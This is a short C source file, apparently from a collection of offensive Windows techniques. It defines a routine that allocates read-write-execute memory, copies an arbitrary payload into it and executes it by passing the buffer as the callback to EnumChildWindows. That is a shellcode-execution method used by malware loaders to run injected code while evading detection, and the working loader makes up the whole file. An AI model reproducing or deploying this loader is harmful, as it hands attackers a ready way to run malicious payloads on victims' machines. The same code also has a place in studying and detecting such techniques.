#include "Win32Helper.h"

VOID InvokeEnumChildWindowsThreadCallbackRoutine(LPVOID lpParameter)
{
	EnumChildWindows(NULL, (WNDENUMPROC)lpParameter, NULL);
}

BOOL MpfSceViaEnumChildWindows(_In_ PBYTE Payload, _In_ DWORD PayloadSizeInBytes)
{
	LPVOID BinAddress = NULL;

	BinAddress = VirtualAlloc(NULL, PayloadSizeInBytes, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (BinAddress == NULL)
		return FALSE;

	CopyMemoryEx(BinAddress, Payload, PayloadSizeInBytes);

	CreateThreadAndWaitForCompletion((LPTHREAD_START_ROUTINE)InvokeEnumChildWindowsThreadCallbackRoutine, BinAddress, INFINITE);
	
	return TRUE;
}